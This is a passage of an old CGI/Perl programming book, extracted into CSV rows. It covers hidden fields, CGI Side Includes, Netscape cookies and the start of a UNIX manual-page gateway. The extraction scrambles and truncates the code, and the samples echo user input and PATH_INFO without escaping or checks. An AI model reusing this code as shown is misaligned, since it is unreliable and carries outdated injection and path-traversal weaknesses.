protocol provides no way to access data from previous requests.,NA,NA
"Imagine an ordering (or ""shopping cart"") system on the Web. You present the user with several forms ",NA,NA
listing the numerous products that can be ordered. The system keeps track of what the user ordered.,NA,NA
"Finally, it displays all of the user's selections. This type of system needs to somehow store the ",NA,NA
"information--or ""state""--so that it can be accessed at a later time.",NA,NA
"For example, suppose you ask the user for his or her address in the first form. If you need this information ",NA,NA
"in a later form, you don't want to ask all over again. Instead, you want to find a way for that address to be ",NA,NA
"accessible to a later form, but transparent to the user. This is the most basic problem of using multiple ",NA,NA
"forms--maintaining ""state"" from one form to another--and thus deserves special attention in this book.",NA,NA
There are several different strategies we'll explore for maintaining state. They include:,"G 
  
 G 
  
 G",NA
"Hidden fields. Using hidden fields, you can embed information into a form that the user won't see, ",NA,NA
but which will be sent back to the CGI program when the form is submitted.,NA,NA
CGI Side Includes. This is a mechanism by which we embed special tags into the HTML document ,NA,NA
that pass CGI variables invisibly.,NA,NA
Netscape Persistent Cookies. The Netscape browser supplies a method for storing and retrieving ,NA,NA
information via CGI.,NA,NA
In ,NA,NA
"Chapter 10, ",NA,NA
Gateways to Internet Information Servers,NA,NA
", we also discuss a fourth approach, which is to",NA,NA
"develop a specialized ""cookie server"" to maintain information associated with a single user. In this ",NA,NA
"chapter, however, we'll restrict ourselves to the more straightforward mechanisms.",NA,NA
8.1 Hidden Fields,NA,NA
As mentioned in ,NA,NA
"Chapter 4, ",NA,NA
Forms and CGI,NA,NA
", hidden fields allow you to store ""hidden"" information within",NA,NA
"a form. These fields are not displayed by the client. However, if the user selects the ""View Source"" option ",NA,NA
"in the browser, the entire form is visible, including the hidden fields. Hidden fields are therefore not ",NA,NA
"meant for security (since anyone can see them), but just for passing information to and from forms ",NA,NA
transparently.,NA,NA
Here is an example of two hidden fields that store author information within a form:,NA,NA
"<FORM ACTION=""/cgi-bin/test.pl"" METHOD=""POST""> ",NA,NA
.,NA,NA
.,NA,NA
"<INPUT TYPE=""hidden"" NAME=""author""  VALUE=""Larry Bird""> ",NA,NA
"<INPUT TYPE=""hidden"" NAME=""company"" VALUE=""Boston Celtics""> ",NA,NA
.,NA,NA
.,NA,NA
</FORM>,NA,NA
"When the form is submitted, the information within the hidden fields is encoded, as the client passes all ",NA,NA
"the fields to the server in the same exact manner. As far as the CGI program is concerned, there is no ",NA,NA
"difference between hidden fields and regular, visible fields.",NA,NA
One thing to note is that certain browsers may not be able to handle hidden fields correctly.,NA,NA
AOA simple way to use hidden fields for maintaining state involves writing the information from a form ,NA,NA
as hidden field information into its successive form. Here is a simple first form:,NA,NA
"<FORM ACTION=""/cgi-bin/test.pl"" METHOD=""POST""> ",NA,NA
"Name: <INPUT TYPE=""text""  NAME=""01 Full Name"" SIZE=40> ",NA,NA
<BR> ,NA,NA
"EMail: <INPUT TYPE=""text"" NAME=""02 EMail"" SIZE=40> ",NA,NA
<BR> ,NA,NA
"<INPUT TYPE=""submit"" VALUE=""Submit the survey""> ",NA,NA
"<INPUT TYPE=""reset""  VALUE=""Clear all fields""> ",NA,NA
</FORM>,NA,NA
"When this form is submitted, the program retrieves the information and creates a dynamic second form, ",NA,NA
"based on the first form, like this:",NA,NA
"<FORM ACTION=""/cgi-bin/test.pl"" METHOD=""POST""> ",NA,NA
"<INPUT TYPE=""hidden"" NAME=""01 Full Name"" VALUE=""Shishir Gundavaram""> ",NA,NA
"<INPUT TYPE=""hidden"" NAME=""02 EMail"" VALUE=""shishir@acs.bu.edu""> ",NA,NA
What is your favorite WWW browser?,NA,NA
<BR> ,NA,NA
"Browser: <INPUT TYPE=""text"" NAME=""03 Browser"" SIZE=40> ",NA,NA
<BR> ,NA,NA
"<INPUT TYPE=""submit"" VALUE=""Submit the survey""> ",NA,NA
"<INPUT TYPE=""reset""  VALUE=""Clear all fields""> ",NA,NA
</FORM>,NA,NA
"As you can see, the two fields, along with the user information, are inserted into the second form. The ",NA,NA
main advantage of such a process is that there is no need for magic cookies and temporary files. On the ,NA,NA
"other hand, the disadvantage is that the form information is appended repeatedly to successive forms, ",NA,NA
creating large forms. This could result in possible performance problems.,NA,NA
Let's look at an example using this technique. Here is the first form:,NA,NA
<HTML> ,NA,NA
<HEAD><TITLE>Welcome to the CGI Shopping Cart</TITLE></HEAD>,NA,NA
<BODY> ,NA,NA
<H1>CGI Shopping Cart</H1> ,NA,NA
Welcome! Thanks for stopping by the CGI Shopping Cart. Here is a list ,NA,NA
"of some of our products. We hope you like them, and please visit again.",NA,NA
"<FORM ACTION=""/cgi-bin/shopping.pl/catalog.html"" METHOD=""POST""> ",NA,NA
<HR> ,NA,NA
What is your full name: <BR> ,NA,NA
"<INPUT TYPE=""text"" NAME=""01 Full Name"" SIZE=40> ",NA,NA
<P> ,NA,NA
What is your e-mail address: <BR> ,NA,NA
"<INPUT TYPE=""text"" NAME=""02 Email"" SIZE=40> ",NA,NA
<P> ,NA,NA
"<INPUT TYPE=""submit"" VALUE=""Submit and Retrieve Catalog""> ",NA,NA
"<INPUT TYPE=""reset""  VALUE=""Clear all fields""> ",NA,NA
</FORM> ,NA,NA
</BODY></HTML>,NA,NA
The most important thing to note here is the extra path information passed to the program. This filename ,NA,NA
"represents the next form to be displayed. The two fields in this form will be ""hidden"" in ",NA,NA
/catalog.html,NA,NA
.,NA,NA
"Now, here is the second form:",NA,NA
<HTML> ,NA,NA
<HEAD><TITLE>Welcome to the CGI Shopping Cart</TITLE></HEAD> ,NA,NA
<BODY> ,NA,NA
<H1>CGI Shopping Cart</H1> ,NA,NA
Thanks for visiting our server. Here is a catalog of some of our books.,NA,NA
Make your selections and press the submit buttons. Note: multiple ,NA,NA
selections are allowed.,NA,NA
<HR> ,NA,NA
"<FORM ACTION=""/cgi-bin/shopping.pl"" METHOD=""POST""> ",NA,NA
<H2>Books on Networking</H2> ,NA,NA
"<SELECT NAME=""03 Networking Books"" SIZE=3 MULTIPLE> ",NA,NA
<OPTION SELECTED>Managing Internet Information Services ,NA,NA
<OPTION>TCP/IP Network Administration ,NA,NA
<OPTION>Linux Network Administrator's Guide ,NA,NA
<OPTION>Managing UUCP and Usenet ,NA,NA
<OPTION>The USENET Handbook ,NA,NA
</SELECT> ,NA,NA
<HR> ,NA,NA
<H2>UNIX related Books</H2> ,NA,NA
"<SELECT NAME=""04 UNIX Books"" SIZE=3 MULTIPLE> ",NA,NA
<OPTION SELECTED>Learning the UNIX Operating System ,NA,NA
<OPTION>Learning the Korn Shell ,NA,NA
<OPTION>UNIX Power Tools ,NA,NA
<OPTION>Learning Perl ,NA,NA
<OPTION>Programming Perl ,NA,NA
<OPTION>Learning the GNU Emacs ,NA,NA
</SELECT> ,NA,NA
"<INPUT TYPE=""submit"" VALUE=""Submit the selection""> ",NA,NA
"<INPUT TYPE=""reset""  VALUE=""Clear all fields""> ",NA,NA
</FORM>,NA,NA
</BODY></HTML>,NA,NA
The ACTION attribute does not contain extra path information. This represents the last form in the ,NA,NA
"""shopping cart."" Also note the fact that there is a scrolled list that allows multiple selections. The program ",NA,NA
displays any form element that has multiple selection in a unique way.,NA,NA
The program begins as follows:,NA,NA
#!/usr/local/bin/perl ,NA,NA
"$webmaster = ""shishir\@bu\.edu""; ",NA,NA
"$document_root = ""/home/shishir/httpd_1.4.2/public""; ",NA,NA
$request_method = $ENV{'REQUEST_METHOD'}; ,NA,NA
$form_file = $ENV{'PATH_INFO'}; ,NA,NA
$full_path = $document_root . $form_file; ,NA,NA
$exclusive_lock = 2; ,NA,NA
$unlock = 8; ,NA,NA
"if ($request_method eq ""GET"") {",NA,NA
 if ($form_file) {,NA,NA
 &display_file ();,NA,NA
 } else {,NA,NA
" &return_error (500, ""CGI Shopping Cart Error"",",NA,NA
" ""An initial form must be specified."");",NA,NA
 },NA,NA
"If the program was requested with the GET protocol and extra path information, the ",NA,NA
display_file ,NA,NA
subroutine is called to output the form. The program should be accessed with the following URL:,NA,NA
http://your.machine/cgi-bin/shopping.pl/start.html,NA,NA
where ,NA,NA
/start.html,NA,NA
" represents the first form. If no path information is specified, an error message is ",NA,NA
returned.,NA,NA
"} elsif ($request_method eq ""POST"") {",NA,NA
 &parse_form_data (*STATE);,NA,NA
 if ($form_file) {,NA,NA
 &parse_file ();,NA,NA
 } else {,NA,NA
 &thank_you ();,NA,NA
 },NA,NA
"If extra path information is passed to this program with the POST method, the ",NA,NA
parse_file,NA,NA
 subroutine is ,NA,NA
invoked. This subroutine inserts the information from the previous form(s) into the current form as hidden ,NA,NA
"fields. Remember, the form information is stored in the ",NA,NA
STATE,NA,NA
" associative array. On the other hand, if no ",NA,NA
"path information is specified, it is the end of the data collection process. The ",NA,NA
thank_you ,NA,NA
subroutine ,NA,NA
displays the information from all the forms.,NA,NA
} else {,NA,NA
" &return_error (500, ""Server Error"",",NA,NA
" ""Server uses unsupported method""); ",NA,NA
} ,NA,NA
exit (0);,NA,NA
The ,NA,NA
display_file,NA,NA
 subroutine simply outputs the first form to standard output.,NA,NA
sub display_file ,NA,NA
{,NA,NA
" open (FILE, ""<"" . $full_path) || ",NA,NA
" &return_error (500, ""CGI Shopping Cart Error"",",NA,NA
" ""Cannot read from the form file [$full_path]."");",NA,NA
" flock (FILE, $exclusive_lock);",NA,NA
" print ""Content-type: text/html"", ""\n\n"";",NA,NA
 while (<FILE>) {,NA,NA
 print;,NA,NA
 },NA,NA
" flock (FILE, $unlock);",NA,NA
 close (FILE);    ,NA,NA
},NA,NA
The ,NA,NA
parse_file,NA,NA
" subroutine inserts information from previous forms into the current form, as hidden fields.",NA,NA
sub parse_file ,NA,NA
{,NA,NA
" local ($key, $value);",NA,NA
" open (FILE, ""<"" . $full_path) ||",NA,NA
" &return_error (500, ""CGI Shopping Cart Error"",",NA,NA
" ""Cannot read from the form file [$full_path]."");",NA,NA
" flock (FILE, $exclusive_lock);",NA,NA
" print ""Content-type: text/html"", ""\n\n"";",NA,NA
 while (<FILE>) {,NA,NA
 if (/<\s*form\s*.*>/i) {,NA,NA
 print;,NA,NA
 foreach $key (sort (keys %STATE)) {,NA,NA
 $value = $STATE{$key};,NA,NA
 print <<End_of_Hidden; ,NA,NA
"<INPUT TYPE=""hidden"" NAME=""$key"" VALUE=""$value""> ",NA,NA
End_of_Hidden,NA,NA
 },NA,NA
The file specified by PATH_INFO is opened. The ,NA,NA
while,NA,NA
 loop iterates through the file one line at a time. ,NA,NA
"The regular expression checks for the <FORM> tag within the document. If it is found, the line containing ",NA,NA
"the tag is displayed. Also, the ",NA,NA
foreach,NA,NA
" construct iterates through all of the key-value form pairs, and ",NA,NA
outputs a hidden field for each one.,NA,NA
 } else {,NA,NA
 print;,NA,NA
 },NA,NA
 }    ,NA,NA
"If the <FORM> tag is not found, the line from the file is output verbatim.",NA,NA
},NA,NA
" flock (FILE, $unlock);",NA,NA
 close (FILE);,NA,NA
The,NA,NA
 thank_you,NA,NA
 subroutine thanks the user and displays the data he or she selected.,NA,NA
sub thank_you ,NA,NA
{,NA,NA
" local ($key, $value, @all_values);",NA,NA
 print <<Thanks; ,NA,NA
Content-type: text/html ,NA,NA
<HTML> ,NA,NA
<HEAD><TITLE>Thank You!</TITLE></HEAD> ,NA,NA
<BODY> ,NA,NA
<H1>Thank You!</H1> ,NA,NA
Thank you again for using our service. Here are the items ,NA,NA
that you selected: ,NA,NA
<HR> ,NA,NA
<P> ,NA,NA
Thanks,NA,NA
"This subroutine formats and displays the information stored in the STATE associative array, which ",NA,NA
represents the combined data from all the forms.,NA,NA
 foreach $key (sort (keys %STATE)) {,NA,NA
 $value = $STATE{$key};,NA,NA
 $key =~ s/^\d+\s//;,NA,NA
 if ($value =~ /\0/) {,NA,NA
" print ""<B>"", $key, ""</B>"", ""<BR>"", ""\n"";",NA,NA
 $value =~ s/\0/<BR>\n/g;,NA,NA
" print $value, ""<BR>"", ""\n"";",NA,NA
"If a particular value contains a null string, it is replaced with "" <BR>"" followed by a newline character. As ",NA,NA
"a result, the multiple values are displayed properly.",NA,NA
},NA,NA
 } else {,NA,NA
" print $key, "": "", $value, ""<BR>"", ""\n"";",NA,NA
 },NA,NA
 },NA,NA
" print ""<HR>"", ""\n"";",NA,NA
" print ""</BODY></HTML>"", ""\n"";",NA,NA
The ,NA,NA
parse_form_data,NA,NA
" subroutine is similar to the one used in the ""survey"" program above, except it does ",NA,NA
not handle any query information.,NA,NA
sub parse_form_data ,NA,NA
{,NA,NA
 local (*FORM_DATA) = @_;,NA,NA
" local ($query_string, @key_value_pairs, $key_value, $key, $value);",NA,NA
" read (STDIN, $query_string, $ENV{'CONTENT_LENGTH'}); ",NA,NA
"@key_value_pairs = split (/&/, $query_string);",NA,NA
} ,NA,NA
 foreach $key_value (@key_value_pairs) {,NA,NA
" ($key, $value) = split (/=/, $key_value);",NA,NA
 $key   =~ tr/+/ /;,NA,NA
 $value =~ tr/+/ /;,NA,NA
" $key   =~ s/%([\dA-Fa-f][\dA-Fa-f])/pack (""C"", hex ($1))/eg;",NA,NA
 ,NA,NA
"$value =~ s/%([\dA-Fa-f][\dA-Fa-f])/pack (""C"", hex ($1))/eg;",NA,NA
 if ,NA,NA
(defined($FORM_DATA{$key})) {,NA,NA
" $FORM_DATA{$key} = join (""\0"", $FORM_DATA{$key}, $value);",NA,NA
 ,NA,NA
} else {,NA,NA
 $FORM_DATA{$key} = $value;,NA,NA
 },NA,NA
 },NA,NA
Security,NA,NA
CGI Side Includes,NA,NA
8.2 CGI Side Includes,"Using hidden fields is probably the simplest way to maintain information across multiple CGI instances. But it is far from the 
 most efficient.
  
 In this next example of maintaining state, we embed special codes into HTML documents that resemble Server Side Includes 
 (see 
 Chapter 5, 
 Server Side Includes
 , for more information on Server Side Includes). These codes are actually parsed by a CGI 
 program which uses the codes to maintain information across several documents. This algorithim is best illustrated via 
 example.
  
 Let's create a multiple survey form system. Here is the first form of the survey:
  
 <HTML> 
  
 <HEAD><TITLE>Television/Movie Survey</TITLE></HEAD> 
  
 <BODY> 
  
 <H1>Welcome to the CGI Network!</H1> 
  
 <HR> 
  
 In order to better serve you, we would like to know what type of movies 
 and variety shows you like to watch on TV. Over the last couple of 
 years, you, the viewers, were directly responsible for the lasting 
 success of many of our shows. Your comments are extremely valuable to 
 us, so please take a few moments to fill out a survey.
  
 <P> 
  
 The current time is: <!--#insert var=""DATE_TIME""--><BR>
  
 At first glance, the construct in the last line displayed above looks like a Server Side Include. However, it is not! This 
 document first gets parsed by a CGI program that looks for statements like these and replaces them with appropriate 
 information. Let's refer to these statements as CGI Side Includes ( CSIs), or ""pseudo"" Server Side Includes. In this case, the 
 program will insert the current date and time.
  
 You may ask, what is the advantage of such a process? It allows you to insert dynamic information in otherwise static 
 documents. Another alternative to this would be to place the information contained within the document in the program, such 
 as:
  
 print <<End_of_Form; 
  
 <HTML> 
  
 <HEAD><TITLE>Sample Form</TITLE></HEAD> 
  
 <BODY> 
  
 <H1>This is a test of a sample form</H1> 
  
 The current time is: $date_time 
  
 <HR> 
  
 .
  
 .
  
 .
  
 </BODY></HTML> 
  
 End_of_Form
  
 As you can see, this can be quite cumbersome, especially if the document is large. Now, let's proceed with the rest of the form.
  
 <HR> 
  
 <FORM ACTION=""/cgi-bin/survey.pl?",NA
CSI Statements and Hidden Fields,"The hidden field technique we described earlier allows us to modify the ordering system presented earlier in two ways. The 
 first is to replace the query information in the ACTION attribute of the <FORM> tag with hidden fields. Let's look at the 
 starting form again:
  
 <HTML> 
  
 <HEAD><TITLE>Television/Movie Survey</TITLE></HEAD> 
  
 <BODY> 
  
 <H1>Welcome to the CGI Network!</H1> 
  
 <HR> 
  
 In order to better serve you, we would like to know what type of 
 movies and variety shows you like to watch on TV. Over the last couple 
 of years, you, the viewers, were directly responsible for the lasting 
 success of many of our shows. Your comments are extremely valuable to 
 us, so please take a few moments to fill out a survey.
  
 <P> 
  
 The current time is: <!--#insert var=""DATE_TIME""--><BR>
  
 If we want the current time to be displayed in the form, we need to keep this statement.
  
 <HR> 
  
 <FORM ACTION=""/cgi-bin/survey.pl?cgi_cookie=<!--#insert 
 var=""COOKIE""-->&cgi_form_num="" METHOD=""POST"">
  
 This can be modified to:
  
 <FORM ACTION=""/cgi-bin/survey.pl"" METHOD=""POST""> 
  
 <INPUT TYPE=""hidden"" NAME=""cgi_cookie"" VALUE=""<!--#insert var=""COOKIE""-->"" 
 <INPUT TYPE=""hidden"" NAME=""cgi_form_num"" VALUE=""<!--#insert var=""NUMBER""-->""
  
 The program described above will replace the CSI statements with appropriate information.
  
 <PRE> 
  
 Full Name: <INPUT TYPE=""text"" NAME=""01 Full Name"" SIZE=40> 
  
 E-Mail:    <INPUT TYPE=""text"" NAME=""02 EMail Address"" SIZE=40> 
  
 </PRE> 
  
 <P> 
  
 Which survey would you like to fill out: <BR> 
  
 <INPUT TYPE=""radio"" NAME=""cgi_survey"" VALUE=""Television"" CHECKED>Television<BR>",NA
8.3 Netscape Persistent Cookies,NA,NA
A third way of maintaining state is to use Netscape persistent cookies. One of the features of the Netscape ,NA,NA
Navigator browser is the capability to store information on the client side. It does this by accepting a new ,NA,NA
Set-,NA,NA
Cookie,NA,NA
" header from CGI programs, and passing that information back using a HTTP_COOKIE environment ",NA,NA
"variable. We won't show a complete example, but we'll illustrate briefly.",NA,NA
A program that stores the information on the client side might begin as follows:,NA,NA
#!/usr/local/bin/perl,NA,NA
"($key, $value) = split(/=/, $ENV{'QUERY_STRING'});",NA,NA
"print ""Content-type: text/html"", ""\n""; ",NA,NA
"print ""Set-Cookie: $key=$value; expires=Sat, 26-Aug-95 15:45:30 GMT; path=/;",NA,NA
"domain=bu.edu"", ""\n\n"";",NA,NA
The cookie header requires the key/value information to be encoded.,NA,NA
.,NA,NA
. ,NA,NA
.,NA,NA
exit (0);,NA,NA
The ,NA,NA
Set-Cookie,NA,NA
" header sets one cookie on the client side, where a key is equal to a value. The ",NA,NA
expires,NA,NA
 attribute ,NA,NA
allows you to set an expiration date for the cookie. The ,NA,NA
path,NA,NA
 attribute specifies the subset of URLs that the cookie ,NA,NA
"is valid for. In this case, the cookie is valid and can be retrieved by any program served from the document root ",NA,NA
"hierarchy. Finally, the ",NA,NA
domain,NA,NA
" attribute sets the domain for which the cookie is valid. For example, say a cookie ",NA,NA
"labeled ""Parts"" is set with a ",NA,NA
domain,NA,NA
" attribute of ""bu.edu"". If the user accesses a URL in another domain that tries ",NA,NA
"to retrieve the cookie ""Parts,"" it will be unable to do so. You can also use the attribute ",NA,NA
secure,NA,NA
 to instruct the ,NA,NA
"browser to send a cookie only on a secure channel (e.g., Netscape's HTTPS server). All of these attributes are ",NA,NA
optional.,NA,NA
"Now, how does a program access the stored cookies? When a certain document is accessed by the user, the ",NA,NA
browser will send the cookie information--provided that it is valid to do so--as the environment variable ,NA,NA
"HTTP_COOKIE. For example, if the user requests a document for which the cookie is valid before the cookie ",NA,NA
"expiration date, the following information might be stored in HTTP_COOKIE:",NA,NA
Full%20Name=Shishir%20Gundavaram; Specification=CGI%20Book,NA,NA
"Cookies are separated from the next by the "" ; "" delimiter. To decode this information and place it into an ",NA,NA
"associative array, we can use the following subroutine:",NA,NA
sub parse_client_cookies,NA,NA
{,NA,NA
 local (*COOKIE_DATA) = @_;,NA,NA
},NA,NA
" local (@key_value_pairs, $key_value, $key, $value);",NA,NA
" @key_value_pairs = split (/;\s/, $ENV{'HTTP_COOKIE'});",NA,NA
 foreach $key_value (@key_value_pairs) {,NA,NA
" ($key, $value) = split (/=/, $key_value);",NA,NA
 $key   =~ tr/+/ /;,NA,NA
 $value =~ tr/+/ /;,NA,NA
" $key   =~ s/%([\dA-Fa-f][\dA-Fa-f])/pack (""C"", hex ($1))/eg;",NA,NA
 ,NA,NA
"$value =~ s/%([\dA-Fa-f][\dA-Fa-f])/pack (""C"", hex ($1))/eg;",NA,NA
 if ,NA,NA
(defined($FORM_DATA{$key})) {,NA,NA
" $FORM_DATA{$key} = join (""\0"", $FORM_DATA{$key}, $value);",NA,NA
 } else {,NA,NA
 $FORM_DATA{$key} = $value;,NA,NA
 },NA,NA
 },NA,NA
This subroutine is very similar to the one we have been using to decode form information. You can set more than ,NA,NA
"one cookie at a time, for example:",NA,NA
"print ""Set-Cookie: Computer=SUN; path=/"", ""\n"";",NA,NA
"print ""Set-Cookie: Computer=AIX; path=/images"", ""\n"";",NA,NA
"Now, if the user requests the URL in the path ",NA,NA
/images,NA,NA
", HTTP_COOKIE will contain:",NA,NA
Computer=SUN; Computer=AIX,NA,NA
"There are a couple of disadvantages with this client-side approach to storing information. First, the technique ",NA,NA
"only works for Netscape Navigator browsers. Second, there are restrictions placed on the cookie size and number ",NA,NA
"of cookies. The information contained in each cookie cannot exceed 4KB, and only 20 cookies are allowed per ",NA,NA
domain. A total of 300 cookies can be stored by each user.,NA,NA
CGI Side Includes,NA,NA
"Gateways, Databases, and",NA,NA
Search/Index Utilities,NA,NA
"9. Gateways, Databases, and ",NA,NA
Search/Index Utilities,NA,NA
Contents: ,NA,NA
UNIX Manual Page Gateway ,NA,NA
Mail Gateway,NA,NA
Relational Databases,NA,NA
Search/Index Gateway,NA,NA
Imagine a situation where you have an enormous amount of data stored in a format that is foreign to a typical ,NA,NA
"web browser. And you need to find a way to present this information on the Web, as well as allowing potential ",NA,NA
users to search through the information. How would you accomplish such a task?,NA,NA
Many information providers on the Web find themselves in situations like this. Such a problem can be solved ,NA,NA
by writing a CGI program that acts as a gateway between the data and the Web. A simple gateway program ,NA,NA
was presented in ,NA,NA
"Chapter 7, ",NA,NA
Advanced Form Applications,NA,NA
. The pie graph program can read the ice cream ,NA,NA
data,NA,NA
"file and produce a graph illustrating the information contained within it. In this chapter, we will discuss ",NA,NA
"gateways to UNIX programs, relational databases, and search engines.",NA,NA
9.1 UNIX Manual Page Gateway,NA,NA
Manual pages on a UNIX operating system provide documentation on the various software and utilities ,NA,NA
"installed on the system. In this section, I will write a gateway that reads the requested manual page, converts it ",NA,NA
"to HTML, and displays it (see ",NA,NA
Figure 9.1,NA,NA
"). We will let the standard utility for formatting manual pages, ",NA,NA
nroff,NA,NA
",",NA,NA
do most of the work. But this example is useful for showing what a little HTML can do to spruce up a ,NA,NA
document. The key technique you need is to examine the input expected by a program and the output that it ,NA,NA
"generates, so that you can communicate with it.",NA,NA
Figure 9.1: Converting manual page to HTML,NA,NA
Here is the form that is presented to the user:,NA,NA
<HTML> ,NA,NA
<HEAD><TITLE>UNIX Manual Page Gateway</TITLE></HEAD> ,NA,NA
<BODY> ,NA,NA
<H1>UNIX Manual Page Gateway</H1> ,NA,NA
<HR> ,NA,NA
"<FORM ACTION=""/cgi-bin/manpage.pl"" METHOD=""POST""> ",NA,NA
<EM>What manual page would you like to see?</EM> ,NA,NA
<BR> ,NA,NA
"<INPUT TYPE=""text"" NAME=""manpage"" SIZE=40> ",NA,NA
<P> ,NA,NA
<EM>What section is that manual page located ,NA,NA
in?</EM> <BR> ,NA,NA
"<SELECT NAME=""section"" SIZE=1> ",NA,NA
<OPTION SELECTED>1 ,NA,NA
<OPTION>2 ,NA,NA
<OPTION>3 ,NA,NA
<OPTION>4 ,NA,NA
<OPTION>5 ,NA,NA
<OPTION>6 ,NA,NA
<OPTION>7 ,NA,NA
<OPTION>8 ,NA,NA
<OPTION>Don't Know ,NA,NA
</SELECT> ,NA,NA
<P> ,NA,NA
"<INPUT TYPE=""submit"" VALUE=""Submit the form""> ",NA,NA
"<INPUT TYPE=""reset""  VALUE=""Clear all fields""> ",NA,NA
</FORM>,NA,NA
<HR> ,NA,NA
</BODY></HTML>,NA,NA
This form will be rendered as shown in ,NA,NA
Figure 9.2,NA,NA
.,NA,NA
Figure 9.2: UNIX manual page form,NA,NA
"On nearly all UNIX systems, manual pages are divided into eight or more sections (or subdirectories), located ",NA,NA
under one main directory--usually,NA,NA
 /usr/local/man,NA,NA
 or ,NA,NA
/usr/man,NA,NA
.This form asks the user to provide the section ,NA,NA
number for the desired manual page.,NA,NA
"The CGI program follows. The main program is devoted entirely to finding the right section, and the particular ",NA,NA
manual page. A subroutine invokes ,NA,NA
nroff,NA,NA
 on the page to handle the internal ,NA,NA
nroff,NA,NA
 codes that all manual pages ,NA,NA
"are formatted in, then converts the ",NA,NA
nroff,NA,NA
 output to HTML.,NA,NA
#!/usr/local/bin/perl ,NA,NA
"$webmaster = ""Shishir Gundavaram (shishir\@bu\.edu)""; ",NA,NA
$script = $ENV{'SCRIPT_NAME'}; ,NA,NA
"$man_path = ""/usr/local/man""; ",NA,NA
"$nroff = ""/usr/bin/nroff -man"";",NA,NA
The program assumes that the manual pages are stored in the ,NA,NA
/usr/local/man,NA,NA
 directory. The ,NA,NA
nroff,NA,NA
 utility ,NA,NA
formats the manual page according to the directives found within the document. A typical unformatted manual ,NA,NA
page looks like this:,NA,NA
".TH EMACS 1 ""1994 April 19"" ",NA,NA
.UC 4 ,NA,NA
.SH NAME ,NA,NA
emacs \- GNU project Emacs ,NA,NA
.SH SYNOPSIS ,NA,NA
.B emacs ,NA,NA
[ ,NA,NA
.I command-line switches ,NA,NA
] [ ,NA,NA
.I files ...,NA,NA
] ,NA,NA
.br ,NA,NA
.SH DESCRIPTION ,NA,NA
.I GNU Emacs ,NA,NA
is a version of ,NA,NA
".I Emacs, ",NA,NA
written by the author of the original (PDP-10) ,NA,NA
".I Emacs, ",NA,NA
Richard Stallman.,NA,NA
.br ,NA,NA
.,NA,NA
.,NA,NA
.,NA,NA
Once it is formatted by ,NA,NA
nroff,NA,NA
", it looks like this:",NA,NA
EMACS(1)                 USER COMMANDS                   EMACS(1) ,NA,NA
NAME,NA,NA
 emacs - GNU project Emacs ,NA,NA
SYNOPSIS,NA,NA
 emacs [ command-line switches ] [ files ... ] ,NA,NA
DESCRIPTION,NA,NA
" GNU Emacs is a version of Emacs, written by  the  author  of the ",NA,NA
"original (PDP-10) Emacs, Richard Stallman.",NA,NA
.,NA,NA
.,NA,NA
.,NA,NA
Sun Release 4.1    Last change: 1994 April 19                   1,NA,NA
"Now, let's continue with the program to see how this information can be further formatted for display on a web ",NA,NA
browser.,NA,NA
"$last_line = ""Last change:"";",NA,NA
The ,NA,NA
$last_line,NA,NA
 variable contains the text that is found on the last line of each page in a manual. This variable is ,NA,NA
used to remove that line when formatting for the Web.,NA,NA
&parse_form_data (*FORM); ,NA,NA
($manpage = $FORM{'manpage'}) =~ s/^\s*(.*)\b\s*$/$1/; ,NA,NA
$section = $FORM{'section'};,NA,NA
The data in the form is parsed and stored. The ,NA,NA
parse_form_data,NA,NA
 subroutine is the one used initially in the last ,NA,NA
chapter. Leading and trailing spaces are removed from the information in the ,NA,NA
manpage,NA,NA
 field. The reason for ,NA,NA
doing this is so that the specified page can be found.,NA,NA
if ( (!$manpage) || ($manpage !~ /^[\w\+\-]+$/) ) {,NA,NA
" &return_error (500, ""UNIX Manual Page Gateway Error"",",NA,NA
" ""Invalid manual page specification."");",NA,NA
"This block is very important! If a manual page was not specified, or if the information contains characters ",NA,NA
"other than (A-Z, a-z, 0-9, _, +, -), an error message is returned. As discussed in ",NA,NA
"Chapter 7, ",NA,NA
Advanced Form ,NA,NA
Applications,NA,NA
", it is always important to check for shell metacharacters for security reasons.",NA,NA
} else {,NA,NA
 if ($section !~ /^\d+$/) {,NA,NA
 $section = &find_section ();,NA,NA
 ,NA,NA
} else {,NA,NA
 $section = &check_section ();,NA,NA
 },NA,NA
If the ,NA,NA
section,NA,NA
" field consists of a number, the ",NA,NA
check_section,NA,NA
 subroutine is called to check the specified section ,NA,NA
"for the particular manual page. If non-numerical information was passed, such as ""Don't Know,"" the ",NA,NA
find_section,NA,NA
 subroutine iterates through all of the sections to determine the appropriate one. In the regular ,NA,NA
"expression, ""\d"" stands for digit, ""+"" allows for one or more of them, and the ""^"" and ""$"" ensure that nothing ",NA,NA
"but digits are in the string. To simplify this part of the search, we do not allow the ""nonstandard"" ",NA,NA
"subsections some systems offer, such as ",NA,NA
2v,NA,NA
 or ,NA,NA
3m,NA,NA
.,NA,NA
Both of these search subroutines return values upon termination. These return values are used by the code ,NA,NA
below to make sure that there are no errors.,NA,NA
 if ( ($section >= 1) && ($section <= 8) ) {,NA,NA
 &display_manpage ();,NA,NA
 } else {,NA,NA
" &return_error (500, ""UNIX Manual Page Gateway Error"",",NA,NA
" ""Could not find the requested document."");",NA,NA
 } ,NA,NA
} ,NA,NA
exit (0);,NA,NA
The ,NA,NA
find_section,NA,NA
 and ,NA,NA
check_section,NA,NA
 subroutines called above return a value of zero (0) if the specified manual ,NA,NA
page does not exist. This return value is stored in the ,NA,NA
section,NA,NA
 variable. If the information contained in ,NA,NA
section ,NA,NA
"is in the range of 1 through 8, the ",NA,NA
display_manpage,NA,NA
 subroutine is called to display the manual page. ,NA,NA
"Otherwise, an error is returned.",NA,NA
The ,NA,NA
find_section,NA,NA
 subroutine searches for a particular manual page in all the sections (from 1 through 8).,NA,NA
sub find_section ,NA,NA
{,NA,NA
" local ($temp_section, $loop, $temp_dir, $temp_file);",NA,NA
 $temp_section = 0;,NA,NA
 for ($loop=1; $loop <= 8; $loop++) {,NA,NA
" $temp_dir  = join("""", $man_path, ""/man"", $loop);",NA,NA
" $temp_file = join("""", $temp_dir, ""/"", $manpage, ""."", $loop);",NA,NA
find_section,NA,NA
" searches in the subdirectories called ""man1,"" ""man2,"" ""man3,"" etc. And each manual page in the ",NA,NA
"subdirectory is suffixed with the section number, such as ""zmore.1,"" and ""emacs.1."" Thus, the first pass ",NA,NA
"through the loop might join ""/usr/local/man"" with ""man1"" and ""zmore.1"" to make """,NA,NA
/usr/local/man/ ,NA,NA
man1/zmore.1,NA,NA
""", which is stored in the ",NA,NA
$temp_file,NA,NA
 variable.,NA,NA
 },NA,NA
 if (-e $temp_file) {,NA,NA
 $temp_section = $loop; ,NA,NA
},NA,NA
